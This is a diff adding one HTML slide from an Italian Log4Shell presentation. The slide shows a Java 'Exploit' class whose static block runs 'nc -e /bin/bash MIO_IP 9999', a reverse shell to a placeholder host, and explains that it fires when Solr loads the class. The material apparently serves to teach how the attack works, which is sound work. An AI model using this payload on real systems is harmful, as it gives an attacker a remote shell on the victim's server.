@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Log4Shell - Weaponization</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/tomorrow-night-blue.min.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Weaponization: Creare la bomba</h1>
+        <div class="subtitle">Il Payload Java</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Codice</div>
+                <div class="card-text">
+                    <pre><code class="language-java">public class Exploit {
+  static {
+    try {
+      Runtime.getRuntime().exec("nc -e /bin/bash MIO_IP 9999");
+    } catch (Exception e) {}
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Spiegazione</div>
+                <div class="card-text">
+                    <p>Questo è un minuscolo programma Java.</p>
+                    <p><strong>Blocco static:</strong> È la chiave di tutto. In Java, il codice statico viene eseguito appena il file viene caricato, senza bisogno che nessuno lo chiami esplicitamente.</p>
+                    <p><strong>Comando:</strong> Appena Solr carica questo file, il comando <code>nc -e /bin/bash</code> parte in automatico, regalandoci una shell.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 7;</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <script src="main.js"></script>
+</body>
+</html>
